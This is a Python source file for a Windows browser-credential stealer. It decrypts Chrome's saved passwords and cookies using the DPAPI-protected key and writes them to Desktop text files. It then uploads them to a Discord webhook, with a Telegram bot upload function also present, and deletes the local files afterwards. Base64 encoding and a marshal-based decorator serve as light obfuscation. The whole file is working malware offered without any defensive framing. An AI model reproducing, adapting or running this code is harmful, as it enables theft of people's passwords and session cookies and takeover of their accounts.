import os
import json
import base64
import shutil
import sqlite3
import requests
import win32crypt
import importlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path
from dotenv import load_dotenv

dotenv_path = Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# Encoding and decoding functions
def encode_string(s):
    return base64.b64encode(s.encode()).decode()

def decode_string(s):
    return base64.b64decode(s.encode()).decode()

encoded_discord_webhook_url = encode_string(DISCORD_WEBHOOK_URL)
encoded_telegram_bot_token = encode_string(TELEGRAM_BOT_TOKEN)
encoded_telegram_chat_id = encode_string(TELEGRAM_CHAT_ID)

def get_decoded_discord_webhook_url():
    return decode_string(encoded_discord_webhook_url)

def get_decoded_telegram_bot_token():
    return decode_string(encoded_telegram_bot_token)

def get_decoded_telegram_chat_id():
    return decode_string(encoded_telegram_chat_id)

# Obfuscation decorator
import marshal
import types

def obfuscate_function(func):
    def wrapper(*args, **kwargs):
        global_vars = globals()
        func_code = func.__code__
        obfuscated_code = marshal.dumps(func_code)
        return types.FunctionType(marshal.loads(obfuscated_code), global_vars)(*args, **kwargs)
    return wrapper

# Functions
@obfuscate_function
def get_encryption_keys():
    chrome_local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(chrome_local_state, "r", encoding="utf-8") as read_the_state:
        state_lines = read_the_state.read()
        json_state_lines = json.loads(state_lines)
    encryption_keys = base64.b64decode(json_state_lines["os_crypt"]["encrypted_key"])
    encryption_key = encryption_keys[5:]
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

@obfuscate_function
def decrypt_chrome_data(data, encryption_key):
    try:
        initialization_vector = data[3:15]
        data = data[15:]
        cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(initialization_vector), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(data) + decryptor.finalize()).decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except: return ""

@obfuscate_function
def extract_chrome_password():
    chrome_login_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    password_database = "ChromeData.db"
    shutil.copyfile(chrome_login_data, password_database)
    connect_chrome_database = sqlite3.connect(password_database)
    connection_cursor = connect_chrome_database.cursor()
    connection_cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    encryption_key = get_encryption_keys()
    password_file_path = os.path.join(os.environ["USERPROFILE"], "Desktop", "passwords.txt")
    with open(password_file_path, 'w+', encoding="utf-8") as password_file:
        for all_passwords in connection_cursor.fetchall():
            app_url = all_passwords[0]
            relative_url = all_passwords[1]
            app_username = all_passwords[2]
            app_password = decrypt_chrome_data(all_passwords[3], encryption_key)
            if app_username or app_password:
                password_file.write(f'URL: {app_url, relative_url}\n Username: {app_username}\n Password: {app_password}\n\n')
    connect_chrome_database.close()
    print(f"Password file created at: {password_file_path}")
    return password_file_path

@obfuscate_function
def extract_chrome_cookie():
    chrome_cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    cookies_database = "Cookies.db"
    shutil.copyfile(chrome_cookies_path, cookies_database)
    connect_chrome_database = sqlite3.connect(cookies_database)
    connection_cursor = connect_chrome_database.cursor()
    connection_cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
    encryption_key = get_encryption_keys()
    cookies_file_path = os.path.join(os.environ["USERPROFILE"], "Desktop", "cookies.txt")
    with open(cookies_file_path, 'w+', encoding="utf-8") as cookies_file:
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in connection_cursor.fetchall():
            if not value: decrypted_cookies = decrypt_chrome_data(encrypted_value, encryption_key)
            else: decrypted_cookies = value
            cookies_file.write(f"Host: {host_key}\n Cookie Name: {name}\n Cookie Value : {decrypted_cookies}\n\n")
    connect_chrome_database.close()
    print(f"Cookies file created at: {cookies_file_path}")
    return cookies_file_path

# Function for sending files to Discord
@obfuscate_function
def send_file_to_discord(file_path, file_description):
    decoded_discord_webhook_url = get_decoded_discord_webhook_url()
    with open(file_path, 'rb') as file:
        files = {
            'file': (os.path.basename(file_path), file)
        }
        payload = {
            'content': file_description,
            'username': 'File Sender'
        }
        response = requests.post(decoded_discord_webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print(f"File {file_path} successfully sent to Discord")
        else:
            print(f"Failed to send file {file_path} to Discord: {response.status_code}")

# Function for sending files to Telegram
@obfuscate_function
def send_file_to_telegram(file_path, file_description):
    decoded_telegram_bot_token = get_decoded_telegram_bot_token()
    decoded_telegram_chat_id = get_decoded_telegram_chat_id()
    with open(file_path, 'rb') as file:
        response = requests.post(
            f'https://api.telegram.org/bot{decoded_telegram_bot_token}/sendDocument',
            data={'chat_id': decoded_telegram_chat_id, 'caption': file_description},
            files={'document': file}
        )
        if response.status_code == 200:
            print(f"File {file_path} successfully sent to Telegram")
        else:
            print(f"Failed to send file {file_path} to Telegram: {response.status_code}")

# Function for deleting files
@obfuscate_function
def delete_files():
    password_file_path = os.path.join(os.environ["USERPROFILE"], "Desktop", "passwords.txt")
    cookies_file_path = os.path.join(os.environ["USERPROFILE"], "Desktop", "cookies.txt")
    try:
        if os.path.exists(password_file_path):
            os.remove(password_file_path)
            print(f"Deleted file: {password_file_path}")
        if os.path.exists(cookies_file_path):
            os.remove(cookies_file_path)
            print(f"Deleted file: {cookies_file_path}")
    except Exception as e:
        print(f"Error deleting files: {e}")

# Function to dynamically import and execute functions
def dynamic_import(module_name, func_name):
    module = importlib.import_module(module_name)
    func = getattr(module, func_name)
    return func

# Execute functions dynamically
if __name__ == "__main__":
    dynamic_import(__name__, 'extract_chrome_password')()
    dynamic_import(__name__, 'extract_chrome_cookie')()
    dynamic_import(__name__, 'send_file_to_discord')(os.path.join(os.environ["USERPROFILE"], "Desktop", "passwords.txt"), 'Passwords File')
    dynamic_import(__name__, 'send_file_to_discord')(os.path.join(os.environ["USERPROFILE"], "Desktop", "cookies.txt"), 'Cookies File')
    dynamic_import(__name__, 'delete_files')()
